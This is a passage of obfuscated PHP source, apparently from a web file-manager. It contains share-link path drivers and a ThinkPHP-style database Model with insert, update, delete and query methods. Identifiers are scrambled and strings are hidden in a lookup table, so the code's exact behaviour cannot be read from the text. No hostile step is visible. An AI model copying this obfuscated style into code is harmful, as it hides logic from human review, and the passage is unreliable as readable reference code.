$¨Ó×¹ş¦[1390]); $É™ß­Ïì = _get($GLOBALS[$¨Ó×¹ş¦[7]], $¨Ó×¹ş¦[1391]); $µóş’Ï÷ = Model($¨Ó×¹ş¦[645])->createFileName($­Ş–‡øË[$¨Ó×¹ş¦[86]], $Ş”ç¥ˆ, $É™ß­Ïì); return IO::uploadLink($µóş’Ï÷, $³çºŸØ); } public function fileNameAuto($æºèä–Ì, $´ŒÔúëî, $ÜÙœæ…¸ = REPEAT_REPLACE, $÷î×È»Ø = false) { return $this->model->fileNameAuto($æºèä–Ì, $´ŒÔúëî, $ÜÙœæ…¸, $÷î×È»Ø); } public function fileNameExist($ú©É‚Û, $Äƒ×İ™Ü) { return $this->model->fileNameExist($ú©É‚Û, $Äƒ×İ™Ü); } protected function _fileOut($ˆ·ÆÀÛ¼, $ëÃØŠáë = false, $Ò˜†ãÁİ = false, $ÊĞ¶‹è = '', $¥Î˜õ‘‚ = false) { $Ş¿ƒ­ùŸ =& $_SERVER[Î‹ÃÂŞ„]; $¯„±“Ğ¶ = $this->model->sourceInfo($ˆ·ÆÀÛ¼); if ($¯„±“Ğ¶[$Ş¿ƒ­ùŸ[455]] == $Ş¿ƒ­ùŸ[90]) { header($Ş¿ƒ­ùŸ[1392]); die; } $¥šÂïÇÄ = $this->model->fileInfoGet($ˆ·ÆÀÛ¼); $ÊĞ¶‹è = $¥šÂïÇÄ[$Ş¿ƒ­ùŸ[517]] ? $¥šÂïÇÄ[$Ş¿ƒ­ùŸ[517]] : $ÊĞ¶‹è; $¾ü îé¥ = is_array($GLOBALS[$Ş¿ƒ­ùŸ[171]]) ? $GLOBALS[$Ş¿ƒ­ùŸ[171]][$Ş¿ƒ­ùŸ[32]] : $¯„±“Ğ¶[$Ş¿ƒ­ùŸ[32]]; if ($¥Î˜õ‘‚) { return IO::fileOutServer($¥šÂïÇÄ[$Ş¿ƒ­ùŸ[86]], $ëÃØŠáë, $¾ü îé¥, $ÊĞ¶‹è); } IO::fileOut($¥šÂïÇÄ[$Ş¿ƒ­ùŸ[86]], $ëÃØŠáë, $¾ü îé¥, $ÊĞ¶‹è); } public function fileOut($Â¯•ÖÖ, $Çí³¸³Ë = false, $¡ßîê¥ã = false, $Ô‹ğ‡ó = '') { $this->_fileOut($Â¯•ÖÖ, $Çí³¸³Ë, $¡ßîê¥ã, $Ô‹ğ‡ó); } public function fileOutServer($–®âÙ¿ò, $¬’±´Ó = false, $Çğıëà = false, $ïƒç‚áà = '') { $this->_fileOut($–®âÙ¿ò, $¬’±´Ó, $Çğıëà, $ïƒç‚áà, !0); } protected function _fileOutImage($‘Š„©§ª, $€»“¯€ = 250) { $È€°ÌØ =& $_SERVER[Î‹ÃÂŞ„]; $ºø¤Ğ­÷ = $this->model->pathInfo($‘Š„©§ª); if ($ºø¤Ğ­÷[$È€°ÌØ[455]] == $È€°ÌØ[90]) { show_json($È€°ÌØ[1393] . $‘Š„©§ª, !1); } $ÈŞ÷ØÀş = $this->model->fileInfoGet($‘Š„©§ª); $ºø¤Ğ­÷[$È€°ÌØ[172]] = $ÈŞ÷ØÀş[$È€°ÌØ[86]]; $GLOBALS[$È€°ÌØ[171]] = $ºø¤Ğ­÷; IO::fileOutImage($ÈŞ÷ØÀş[$È€°ÌØ[86]], $€»“¯€); } public function fileOutImage($‘ÈíŒä©, $÷™õ¡ = 250) { $this->_fileOutImage($‘ÈíŒä©, $÷™õ¡); } public function fileOutImageServer($¹ì¾…Ä, $Èüø«¸ = 250) { $this->_fileOutImage($¹ì¾…Ä, $Èüø«¸); } public function link($èÖÀ¦é, $Î‚µøç = '') { $ÌĞ—ô¥Ù = $this->model->fileInfoGet($èÖÀ¦é); return IO::link($ÌĞ—ô¥Ù[$_SERVER[Î‹ÃÂŞ„][86]], $Î‚µøç); } protected function parse($ØòŒ¾ÃÇ) { $ô×ëõ‡ö =& $_SERVER[Î‹ÃÂŞ„]; if (strstr($ØòŒ¾ÃÇ, $ô×ëõ‡ö[8]) === !1) { return array($ô×ëõ‡ö[463] => intval($ØòŒ¾ÃÇ), $ô×ëõ‡ö[86] => $ô×ëõ‡ö[12], $ô×ëõ‡ö[1389] => array()); } $œŞ†€Å– = explode($ô×ëõ‡ö[8], trim($ØòŒ¾ÃÇ, $ô×ëõ‡ö[8])); if (count($œŞ†€Å–) < 2) { show_tips(clear_html($ØòŒ¾ÃÇ) . $ô×ëõ‡ö[1394]); } return array($ô×ëõ‡ö[463] => intval($œŞ†€Å–[0]), $ô×ëõ‡ö[86] => $œŞ†€Å–[1], $ô×ëõ‡ö[1389] => array_slice($œŞ†€Å–, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ê¢¬èïş) { $this->pathParse = $Ê¢¬èïş; $this->model = Model($_SERVER[Î‹ÃÂŞ„][1388]); } public function getPathOuter($‚ı£Øâ‰) { $ÉëÑŒ›´ =& $_SERVER[Î‹ÃÂŞ„]; if (!$‚ı£Øâ‰) { return $‚ı£Øâ‰; } $´å°£Ëæ = $this->parse($‚ı£Øâ‰); return trim(KodIO::makeShare($this->pathParse[$ÉëÑŒ›´[445]], $´å°£Ëæ[$ÉëÑŒ›´[445]]), $ÉëÑŒ›´[8]); } protected function infoParse($Ã£ë¤Éæ, $Ãâ˜Äş€ = false, $Â›é… = false) { $Ö¡øÎÅÚ =& $_SERVER[Î‹ÃÂŞ„]; $Ô…åŠÏª = $this->pathParse[$Ö¡øÎÅÚ[445]]; $©•Îµ¸Î = trim($this->pathParse[$Ö¡øÎÅÚ[1223]], $Ö¡øÎÅÚ[8]); return Action($Ö¡øÎÅÚ[1395])->sharePathInfo($Ô…åŠÏª, $©•Îµ¸Î, $Ãâ˜Äş€); } public function infoFull($Ê×ƒò÷ê) { $ÒĞ¶î÷Ä =& $_SERVER[Î‹ÃÂŞ„]; $ùøÁèÆ = explode($ÒĞ¶î÷Ä[8], trim($Ê×ƒò÷ê, $ÒĞ¶î÷Ä[8])); if (count($ùøÁèÆ) > 1) { $¥ÃÏÆÄ = implode($ÒĞ¶î÷Ä[8], array_splice($ùøÁèÆ, 1)); $ÂØä ú• = $this->model->pathInfoByPath($ùøÁèÆ[0], $¥ÃÏÆÄ); if (!$ÂØä ú•) { return !1; } $this->pathParse[$ÒĞ¶î÷Ä[1223]] = $ÂØä ú•[$ÒĞ¶î÷Ä[183]]; } return $this->infoParse($Ê×ƒò÷ê); } public function listAll($ù¸ïŞò) { $¨ÓÒ¡‘û =& $_SERVER[Î‹ÃÂŞ„]; $€â–£ïÄ = IO::info($this->pathParse[$¨ÓÒ¡‘û[86]]); if (!$€â–£ïÄ) { return array(); } $„ª¬Í¬ = $this->model->listAll($ù¸ïŞò); $ÒØ½÷š = Model($¨ÓÒ¡‘û[635])->getInfo($€â–£ïÄ[$¨ÓÒ¡‘û[636]]); foreach ($„ª¬Í¬ as &$Óã­¼³Ÿ) { check_abort(); $Óã­¼³Ÿ[$¨ÓÒ¡‘û[89]] = Action($¨ÓÒ¡‘û[1395])->_shareItemeParse($Óã­¼³Ÿ[$¨ÓÒ¡‘û[89]], $ÒØ½÷š); } unset($Óã­¼³Ÿ); return $„ª¬Í¬; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¯½èßîØ) { $this->pathParse = $¯½èßîØ; $this->model = Model($_SERVER[Î‹ÃÂŞ„][1388]); } protected function infoParse($İ÷ÎÕº×, $ğ­±Ş° = false, $¢¶˜ˆ‰– = false) { $©€øı» =& $_SERVER[Î‹ÃÂŞ„]; return Action($©€øı»[1229])->sharePathInfo($this->pathParse[$©€øı»[86]], !0, $ğ­±Ş°); } public function listPath($áÕÎú­Ÿ, $›¢ õÜá = false) { $ìˆ™¡²ç =& $_SERVER[Î‹ÃÂŞ„]; $ì·§˜×ô = parent::listPath($áÕÎú­Ÿ, $›¢ õÜá); if (!$ì·§˜×ô) { return $ì·§˜×ô; } if (is_array($ì·§˜×ô[$ìˆ™¡²ç[1396]])) { $ì·§˜×ô[$ìˆ™¡²ç[1396]] = Action($ìˆ™¡²ç[1229])->shareItemInfo($ì·§˜×ô[$ìˆ™¡²ç[1396]]); } foreach ($ì·§˜×ô as $óŒ’à×Ï => $¼±Ù˜õ“) { if (!in_array($óŒ’à×Ï, array($ìˆ™¡²ç[85], $ìˆ™¡²ç[84]))) { continue; } foreach ($¼±Ù˜õ“ as $Ü³œÇ’¹ => $‚éÖ‚ÇÒ) { $ì·§˜×ô[$óŒ’à×Ï][$Ü³œÇ’¹] = Action($ìˆ™¡²ç[1229])->shareItemInfo($‚éÖ‚ÇÒ); } } return $ì·§˜×ô; } public function listAll($ˆ±¦¿Î‰) { $ÇäëëÊ´ =& $_SERVER[Î‹ÃÂŞ„]; $’õßş›’ = IO::info($this->pathParse[$ÇäëëÊ´[86]]); if (!$’õßş›’) { return array(); } $­Æˆ°Š = $this->model->listAll($ˆ±¦¿Î‰); foreach ($­Æˆ°Š as &$Ş…îÇÄş) { $Ş…îÇÄş[$ÇäëëÊ´[89]] = Action($ÇäëëÊ´[1229])->shareItemInfo($Ş…îÇÄş[$ÇäëëÊ´[89]]); } unset($Ş…îÇÄş); return $­Æˆ°Š; } } goto f‰˜†ƒ‡‘ç; F¯ÙÂà¸œ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\x6f\162\144\x65\162", "\x61\x6c\x69\x61\163", "\150\141\x76\x69\x6e\x67", "\x67\162\157\165\x70", "\x6c\157\x63\x6b", "\x64\151\163\x74\x69\x6e\143\x74", "\141\x75\x74\x6f", "\146\151\154\x74\145\x72", "\x76\x61\154\151\144\141\x74\x65", "\x72\x65\163\165\154\x74", "\142\x69\156\144", "\x74\157\x6b\x65\156"); public function __construct($¬ñÆ±á = '', $“é…ÚÖÄ = '', $å„´÷”ì = '') { $¢Æ‡ôîõ =& $_SERVER[Î‹ÃÂŞ„]; $this->_initialize(); if (!empty($¬ñÆ±á)) { if (strpos($¬ñÆ±á, $¢Æ‡ôîõ[10])) { list($this->dbName, $this->name) = explode($¢Æ‡ôîõ[10], $¬ñÆ±á); } else { $this->name = $¬ñÆ±á; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($“é…ÚÖÄ)) { $this->tablePrefix = $¢Æ‡ôîõ[12]; } elseif ($¢Æ‡ôîõ[12] != $“é…ÚÖÄ) { $this->tablePrefix = $“é…ÚÖÄ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¢Æ‡ôîõ[290]); } $this->db(0, empty($this->connection) ? $å„´÷”ì : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $şˆÒ¯é =& $_SERVER[Î‹ÃÂŞ„]; if (empty($this->fields)) { if (think_config($şˆÒ¯é[291])) { $õ²‚­½ß = $this->dbName ? $this->dbName : think_config($şˆÒ¯é[292]); $¬â½†ÃÜ = think_var_cache($şˆÒ¯é[293] . strtolower(get_path_this($õ²‚­½ß) . $şˆÒ¯é[10] . $this->name)); if ($¬â½†ÃÜ) { $öŸ©Áñä = think_config($şˆÒ¯é[294]); if (empty($öŸ©Áñä) || $¬â½†ÃÜ[$şˆÒ¯é[295]] == $öŸ©Áñä) { $this->fields = $¬â½†ÃÜ; return; } } } $this->flush(); } } public function flush() { $ò³É¯Ù‚ =& $_SERVER[Î‹ÃÂŞ„]; $this->db->setModel($this->name); $óæø®œš = $this->db->getFields($this->getTableName()); if (!$óæø®œš) { return !1; } $this->fields = array_keys($óæø®œš); $this->fields[$ò³É¯Ù‚[296]] = !1; foreach ($óæø®œš as $»®óüû => $ßÅô¶Ù) { $şì¸ò„Í[$»®óüû] = $ßÅô¶Ù[$ò³É¯Ù‚[33]]; if ($ßÅô¶Ù[$ò³É¯Ù‚[39]]) { $this->fields[$ò³É¯Ù‚[297]] = $»®óüû; if ($ßÅô¶Ù[$ò³É¯Ù‚[42]]) { $this->fields[$ò³É¯Ù‚[296]] = !0; } } } $this->fields[$ò³É¯Ù‚[298]] = $şì¸ò„Í; if (think_config($ò³É¯Ù‚[294])) { $this->fields[$ò³É¯Ù‚[295]] = think_config($ò³É¯Ù‚[294]); } if (think_config($ò³É¯Ù‚[291])) { $ÑÓ±Å“Ö = $this->dbName ? $this->dbName : think_config($ò³É¯Ù‚[292]); think_var_cache($ò³É¯Ù‚[293] . strtolower(get_path_this($ÑÓ±Å“Ö) . $ò³É¯Ù‚[10] . $this->name), $this->fields); } } public function switchModel($Ü¶¤¾…, $—–è‘Ù = array()) { $”‡õáÉÀ =& $_SERVER[Î‹ÃÂŞ„]; $ÅÚö©š = ucwords(strtolower($Ü¶¤¾…)) . $”‡õáÉÀ[299]; if (!class_exists($ÅÚö©š)) { think_exception($ÅÚö©š . think_lang($”‡õáÉÀ[300])); } $this->_extModel = new $ÅÚö©š($this->name); if (!empty($—–è‘Ù)) { foreach ($—–è‘Ù as $°ä¶•Ü) { $this->_extModel->setProperty($°ä¶•Ü, $this->{$°ä¶•Ü}); } } return $this->_extModel; } public function __set($ØµúŞÖÇ, $€¹½ñı˜) { $this->data[$ØµúŞÖÇ] = $€¹½ñı˜; } public function __get($éÅ¿œ) { return isset($this->data[$éÅ¿œ]) ? $this->data[$éÅ¿œ] : null; } public function __isset($¼æï–¼) { return isset($this->data[$¼æï–¼]); } public function __unset($…ãıİ÷) { unset($this->data[$…ãıİ÷]); } public function __call($Ğ°°¯, $¨µÏëùÒ) { $˜¹€¬ˆ =& $_SERVER[Î‹ÃÂŞ„]; if (in_array(strtolower($Ğ°°¯), $this->methods, !0)) { $this->options[strtolower($Ğ°°¯)] = $¨µÏëùÒ[0]; return $this; } elseif (in_array(strtolower($Ğ°°¯), array($˜¹€¬ˆ[301], $˜¹€¬ˆ[302], $˜¹€¬ˆ[303], $˜¹€¬ˆ[304], $˜¹€¬ˆ[305]), !0)) { $õ¤ôè‡ = isset($¨µÏëùÒ[0]) ? $¨µÏëùÒ[0] : $˜¹€¬ˆ[205]; $õ¤ôè‡ = $this->db->parseKey($õ¤ôè‡); return $this->getField(strtoupper($Ğ°°¯) . $˜¹€¬ˆ[306] . $õ¤ôè‡ . $˜¹€¬ˆ[307] . $Ğ°°¯, $˜¹€¬ˆ[301]); } elseif (strtolower(substr($Ğ°°¯, 0, 5)) == $˜¹€¬ˆ[308]) { $õ¤ôè‡ = think_parse_name(substr($Ğ°°¯, 5)); $€¼÷»ßå[$õ¤ôè‡] = $¨µÏëùÒ[0]; return $this->where($€¼÷»ßå)->find(); } elseif (strtolower(substr($Ğ°°¯, 0, 10)) == $˜¹€¬ˆ[309]) { $±èŒß˜ = think_parse_name(substr($Ğ°°¯, 10)); $€¼÷»ßå[$±èŒß˜] = $¨µÏëùÒ[0]; return $this->where($€¼÷»ßå)->getField($¨µÏëùÒ[1]); } elseif (isset($this->_scope[$Ğ°°¯])) { return $this->scope($Ğ°°¯, $¨µÏëùÒ[0]); } elseif (method_exists($this, $Ğ°°¯)) { array_unshift($¨µÏëùÒ, $Ğ°°¯); return call_user_func_array(array($this, $˜¹€¬ˆ[310]), $¨µÏëùÒ); } else { return call_user_func_array(array(parent, $Ğ°°¯), $¨µÏëùÒ); } } protected function call() { $µ¬æ½€ =& $_SERVER[Î‹ÃÂŞ„]; $áĞ¥Ş = func_get_args(); $öàÛÎÓ = array_shift($áĞ¥Ş); $¡øåù³Ğ = $öàÛÎÓ; if (is_array($öàÛÎÓ)) { $¡øåù³Ğ = $öàÛÎÓ[1]; $öàÛÎÓ = $öàÛÎÓ[0]; } $²Êïú°· = count($áĞ¥Ş) - 1; if (isset($áĞ¥Ş[$²Êïú°·]) && $áĞ¥Ş[$²Êïú°·] === $öàÛÎÓ) { think_exception(__CLASS__ . $µ¬æ½€[4] . $öàÛÎÓ . think_lang($µ¬æ½€[311])); return; } $áĞ¥Ş[] = $öàÛÎÓ; if (method_exists($this, $µ¬æ½€[312])) { $”Šõßì© = call_user_func_array(array($this, $µ¬æ½€[313]), array($¡øåù³Ğ, $áĞ¥Ş)); if (!is_null($”Šõßì©) && $”Šõßì© !== !1) { return $”Šõßì©; } } $îÚãø¶Œ = call_user_func_array(array($this, $öàÛÎÓ), $áĞ¥Ş); if (method_exists($this, $µ¬æ½€[314])) { $”Šõßì© = call_user_func_array(array($this, $µ¬æ½€[315]), array($¡øåù³Ğ, $áĞ¥Ş, $îÚãø¶Œ)); if ($”Šõßì©) { return $”Šõßì©; } } return $îÚãø¶Œ; } protected function _initialize() { } protected function _facade($ËÁÈµ”) { $¶£·ç =& $_SERVER[Î‹ÃÂŞ„]; if (!empty($this->fields)) { foreach ($ËÁÈµ” as $ñËªÈ‰¨ => $ÜÍä·›) { if (is_array($this->fields) && !in_array($ñËªÈ‰¨, $this->fields, !0)) { unset($ËÁÈµ”[$ñËªÈ‰¨]); } elseif (is_scalar($ÜÍä·›)) { $this->_parseType($ËÁÈµ”, $ñËªÈ‰¨); } } } if (!empty($this->options[$¶£·ç[316]])) { $ËÁÈµ” = array_map($this->options[$¶£·ç[316]], $ËÁÈµ”); unset($this->options[$¶£·ç[316]]); } $this->_beforeWrite($ËÁÈµ”); return $ËÁÈµ”; } protected function _beforeWrite(&$Ã¡£óËÎ) { } public function add($ÍŞÖºı³ = '', $¿³Ë£ø¢ = array(), $ÃÉ‹•½› = false) { if (empty($ÍŞÖºı³)) { if (!empty($this->data)) { $ÍŞÖºı³ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Î‹ÃÂŞ„][317]); return !1; } } $¿³Ë£ø¢ = $this->_parseOptions($¿³Ë£ø¢); $ÍŞÖºı³ = $this->_facade($ÍŞÖºı³); if (!1 === $this->_beforeInsert($ÍŞÖºı³, $¿³Ë£ø¢)) { return !1; } $ßõçÃÍç = $this->db->insert($ÍŞÖºı³, $¿³Ë£ø¢, $ÃÉ‹•½›); if (!1 !== $ßõçÃÍç) { $Şµ¨Šö— = $this->getLastInsID(); if ($Şµ¨Šö—) { $ÍŞÖºı³[$this->getPk()] = $Şµ¨Šö—; $this->_after_insert($ÍŞÖºı³, $¿³Ë£ø¢); return $Şµ¨Šö—; } $this->_after_insert($ÍŞÖºı³, $¿³Ë£ø¢); } return $ßõçÃÍç; } protected function _beforeInsert(&$ìñï¯æÆ, $£ÙÌ±¥Ä) { } protected function _after_insert($şŞ–â¹, $¼ÄëèÍ) { } public function addAll($áÕáÑ¢, $Û©›£Õª = array(), $“·õ‚Æ = false) { $Ñ¦íäí =& $_SERVER[Î‹ÃÂŞ„]; if (empty($áÕáÑ¢)) { $this->error = think_lang($Ñ¦íäí[317]); return !1; } $Û©›£Õª = $this->_parseOptions($Û©›£Õª); foreach ($áÕáÑ¢ as $—­ßĞ’ƒ => $¬£úø¤) { $áÕáÑ¢[$—­ßĞ’ƒ] = $this->_facade($¬£úø¤); } if (method_exists($this->db, $Ñ¦íäí[318])) { $Ïš‚²‚Â = $this->db->insertAll($áÕáÑ¢, $Û©›£Õª, $“·õ‚Æ); } else { $this->startTrans(); foreach ($áÕáÑ¢ as $—­ßĞ’ƒ => $¬£úø¤) { $Ïš‚²‚Â = $this->db->insert($¬£úø¤, $Û©›£Õª, $“·õ‚Æ); } $this->commit(); } if (!1 !== $Ïš‚²‚Â) { $Î±ÂÜâ = $this->getLastInsID(); if ($Î±ÂÜâ) { return $Î±ÂÜâ; } } return $Ïš‚²‚Â; } public function selectAdd($»˜îá¨ = '', $Û¬ˆÖÛ = '', $ì™ã¢Ö‡ = array()) { $Áëû”œ =& $_SERVER[Î‹ÃÂŞ„]; $ì™ã¢Ö‡ = $this->_parseOptions($ì™ã¢Ö‡); if (!1 === ($´‘—Ù»ë = $this->db->selectInsert($»˜îá¨ ? $»˜îá¨ : $ì™ã¢Ö‡[$Áëû”œ[319]], $Û¬ˆÖÛ ? $Û¬ˆÖÛ : $this->getTableName(), $ì™ã¢Ö‡))) { $this->error = think_lang($Áëû”œ[320]); return !1; } else { return $´‘—Ù»ë; } } public function save($††Ù°˜æ = '', $­”©¿Ÿû = array()) { $’«çíå… =& $_SERVER[Î‹ÃÂŞ„]; if (empty($††Ù°˜æ)) { if (!empty($this->data)) { $††Ù°˜æ = $this->data; $this->data = array(); } else { $this->error = think_lang($’«çíå…[317]); return !1; } } $††Ù°˜æ = $this->_facade($††Ù°˜æ); $­”©¿Ÿû = $this->_parseOptions($­”©¿Ÿû); $åó¦ù‹Ó = $this->getPk(); if (!isset($­”©¿Ÿû[$’«çíå…[321]])) { if (isset($††Ù°˜æ[$åó¦ù‹Ó])) { $ÓÙÈßÒ®[$åó¦ù‹Ó] = $††Ù°˜æ[$åó¦ù‹Ó]; $­”©¿Ÿû[$’«çíå…[321]] = $ÓÙÈßÒ®; unset($††Ù°˜æ[$åó¦ù‹Ó]); } else { $this->error = think_lang($’«çíå…[320]); return !1; } } if (is_array($­”©¿Ÿû[$’«çíå…[321]]) && isset($­”©¿Ÿû[$’«çíå…[321]][$åó¦ù‹Ó])) { $¢¾­ßÏ¸ = $­”©¿Ÿû[$’«çíå…[321]][$åó¦ù‹Ó]; } if (!1 === $this->_beforeUpdate($††Ù°˜æ, $­”©¿Ÿû)) { return !1; } $‘Ê‰çç½ = $this->db->update($††Ù°˜æ, $­”©¿Ÿû); if (!1 !== $‘Ê‰çç½) { if (isset($¢¾­ßÏ¸)) { $††Ù°˜æ[$åó¦ù‹Ó] = $¢¾­ßÏ¸; } $this->_afterUpdate($††Ù°˜æ, $­”©¿Ÿû); } return $‘Ê‰çç½; } protected function _beforeUpdate(&$Çàş¡ë², $‰íÆí´ı) { } protected function _afterUpdate($áÂ›å÷“, $Ëá¾éØ) { } public function delete($€ñßÌüÃ = array()) { $™ìõ¨ëÇ =& $_SERVER[Î‹ÃÂŞ„]; if (empty($€ñßÌüÃ) && empty($this->options[$™ìõ¨ëÇ[321]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $åÇ™×Ù× = $this->getPk(); if (is_numeric($€ñßÌüÃ) || is_string($€ñßÌüÃ)) { if (strpos($€ñßÌüÃ, $™ìõ¨ëÇ[50])) { $‘è‚éî‘[$åÇ™×Ù×] = array($™ìõ¨ëÇ[322], $€ñßÌüÃ); } else { $‘è‚éî‘[$åÇ™×Ù×] = $€ñßÌüÃ; } $this->options[$™ìõ¨ëÇ[321]] = $‘è‚éî‘; } $€ñßÌüÃ = $this->_parseOptions(); if (is_array($€ñßÌüÃ[$™ìõ¨ëÇ[321]]) && isset($€ñßÌüÃ[$™ìõ¨ëÇ[321]][$åÇ™×Ù×])) { $°¦§–ã• = $€ñßÌüÃ[$™ìõ¨ëÇ[321]][$åÇ™×Ù×]; } $ƒ¨”‡àÂ = $this->db->delete($€ñßÌüÃ); if (!1 !== $ƒ¨”‡àÂ) { $æğ»ø›Ô = array(); if (isset($°¦§–ã•)) { $æğ»ø›Ô[$åÇ™×Ù×] = $°¦§–ã•; } $this->_after_delete($æğ»ø›Ô, $€ñßÌüÃ); } return $ƒ¨”‡àÂ; } protected function _after_delete($”±´ËŒê, $ÑÈ¡€áË) { } public function select($İ¿·¸ÑÂ = array()) { $Üë÷” =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($İ¿·¸ÑÂ) || is_numeric($İ¿·¸ÑÂ)) { $ªÏ˜¼‚Š = $this->getPk(); if (strpos($İ¿·¸ÑÂ, $Üë÷”[50])) { $¶ÀÑğ‹¦[$ªÏ˜¼‚Š] = array($Üë÷”[322], $İ¿·¸ÑÂ); } else { $¶ÀÑğ‹¦[$ªÏ˜¼‚Š] = $İ¿·¸ÑÂ; } $this->options[$Üë÷”[321]] = $¶ÀÑğ‹¦; } elseif (!1 === $İ¿·¸ÑÂ) { $İ¿·¸ÑÂ = $this->_parseOptions(); return $Üë÷”[323] . $this->db->buildSelectSql($İ¿·¸ÑÂ) . $Üë÷”[324]; } $İ¿·¸ÑÂ = $this->_parseOptions(); $Ç¹ƒşÑ¢ = $this->db->select($İ¿·¸ÑÂ); if (!1 === $Ç¹ƒşÑ¢) { return !1; } if (empty($Ç¹ƒşÑ¢)) { return null; } $this->_afterSelect($Ç¹ƒşÑ¢, $İ¿·¸ÑÂ); return $Ç¹ƒşÑ¢; } protected function _afterSelect(&$ÃÓìğ÷¸, $øüé¯¨) { } public function buildSql($±İ÷úĞ± = array()) { $›¿†Ì‰Á =& $_SERVER[Î‹ÃÂŞ„]; $±İ÷úĞ± = $this->_parseOptions($±İ÷úĞ±); return $›¿†Ì‰Á[323] . $this->db->buildSelectSql($±İ÷úĞ±) . $›¿†Ì‰Á[324]; } public function optionsValue($µ‡…İ = null) { if (is_null($µ‡…İ)) { return $this->options; } elseif (is_array($µ‡…İ)) { $this->options = array_merge($this->options, $µ‡…İ); } } protected function _parseOptions($Ò¯ÓåÙˆ = array()) { $¦Ùé³æè =& $_SERVER[Î‹ÃÂŞ„]; if (is_array($Ò¯ÓåÙˆ)) { $Ò¯ÓåÙˆ = array_merge($this->options, $Ò¯ÓåÙˆ); } $this->options = array(); if (!isset($Ò¯ÓåÙˆ[$¦Ùé³æè[325]])) { $Ò¯ÓåÙˆ[$¦Ùé³æè[325]] = $this->getTableName(); $öå­§ßŒ = $this->fields; } else { $öå­§ßŒ = $this->getDbFields(); } if (!empty($Ò¯ÓåÙˆ[$¦Ùé³æè[326]])) { $Ò¯ÓåÙˆ[$¦Ùé³æè[325]] .= $¦Ùé³æè[53] . $Ò¯ÓåÙˆ[$¦Ùé³æè[326]]; } $Ò¯ÓåÙˆ[$¦Ùé³æè[327]] = $this->name; if (isset($Ò¯ÓåÙˆ[$¦Ùé³æè[321]]) && is_array($Ò¯ÓåÙˆ[$¦Ùé³æè[321]]) && !empty($öå­§ßŒ) && !isset($Ò¯ÓåÙˆ[$¦Ùé³æè[328]]) && !isset($Ò¯ÓåÙˆ[$¦Ùé³æè[325]])) { foreach ($Ò¯ÓåÙˆ[$¦Ùé³æè[321]] as $í²û‘ç³ => $¥õ»‡¯â) { $í²û‘ç³ = trim($í²û‘ç³); if (in_array($í²û‘ç³, $öå­§ßŒ, !0)) { if (is_scalar($¥õ»‡¯â)) { $this->_parseType($Ò¯ÓåÙˆ[$¦Ùé³æè[321]], $í²û‘ç³); } } elseif (!is_numeric($í²û‘ç³) && $¦Ùé³æè[11] != substr($í²û‘ç³, 0, 1) && !1 === strpos($í²û‘ç³, $¦Ùé³æè[10]) && !1 === strpos($í²û‘ç³, $¦Ùé³æè[306]) && !1 === strpos($í²û‘ç³, $¦Ùé³æè[329]) && !1 === strpos($í²û‘ç³, $¦Ùé³æè[330])) { unset($Ò¯ÓåÙˆ[$¦Ùé³æè[321]][$í²û‘ç³]); } } } $this->_options_filter($Ò¯ÓåÙˆ); return $Ò¯ÓåÙˆ; } protected function _options_filter(&$÷á—…´¨) { } protected function _parseType(&$çùîÑÌ¿, $šáµ»ê¶) { $”Š÷‡Ï÷ =& $_SERVER[Î‹ÃÂŞ„]; if (empty($this->options[$”Š÷‡Ï÷[331]][$”Š÷‡Ï÷[4] . $šáµ»ê¶])) { $â–ØÏşõ = strtolower($this->fields[$”Š÷‡Ï÷[298]][$šáµ»ê¶]); if (!1 !== strpos($â–ØÏşõ, $”Š÷‡Ï÷[332])) { } elseif (!1 === strpos($â–ØÏşõ, $”Š÷‡Ï÷[333]) && !1 !== strpos($â–ØÏşõ, $”Š÷‡Ï÷[334])) { $çùîÑÌ¿[$šáµ»ê¶] = intval($çùîÑÌ¿[$šáµ»ê¶]); } elseif (!1 !== strpos($â–ØÏşõ, $”Š÷‡Ï÷[335]) || !1 !== strpos($â–ØÏşõ, $”Š÷‡Ï÷[336])) { $çùîÑÌ¿[$šáµ»ê¶] = floatval($çùîÑÌ¿[$šáµ»ê¶]); } elseif (!1 !== strpos($â–ØÏşõ, $”Š÷‡Ï÷[337])) { $çùîÑÌ¿[$šáµ»ê¶] = (bool) $çùîÑÌ¿[$šáµ»ê¶]; } } } public function find($šĞŠÍ§‡ = array()) { $ÑÆúï½Ø =& $_SERVER[Î‹ÃÂŞ„]; if (is_numeric($šĞŠÍ§‡) || is_string($šĞŠÍ§‡)) { $”„·©Ôî[$this->getPk()] = intval($šĞŠÍ§‡); $this->options[$ÑÆúï½Ø[321]] = $”„·©Ôî; } $this->options[$ÑÆúï½Ø[338]] = 1; $šĞŠÍ§‡ = $this->_parseOptions(); $Û›·¡Ùß = $this->db->select($šĞŠÍ§‡); if (!1 === $Û›·¡Ùß) { return !1; } if (empty($Û›·¡Ùß)) { return null; } $this->data = $Û›·¡Ùß[0]; $this->_afterFind($this->data, $šĞŠÍ§‡); if (!empty($this->options[$ÑÆúï½Ø[339]])) { return $this->returnResult($this->data, $this->options[$ÑÆúï½Ø[339]]); } return $this->data; } protected function _afterFind(&$úİÌèÓü, $ë£ôÌ˜‹) { } protected function returnResult($¯×Ûû£ , $ĞùŞ = '') { $öÚ”˜‘ =& $_SERVER[Î‹ÃÂŞ„]; if ($ĞùŞ) { if (is_callable($ĞùŞ)) { return call_user_func($ĞùŞ, $¯×Ûû£ ); } switch (strtolower($ĞùŞ)) { case $öÚ”˜‘[340]: return json_encode($¯×Ûû£ ); case $öÚ”˜‘[341]: return xml_encode($¯×Ûû£ ); } } return $¯×Ûû£ ; } public function parseFieldsMap($ÃÓŞã¥, $¹Â¾ƒŸÔ = 1) { if (!empty($this->_map)) { foreach 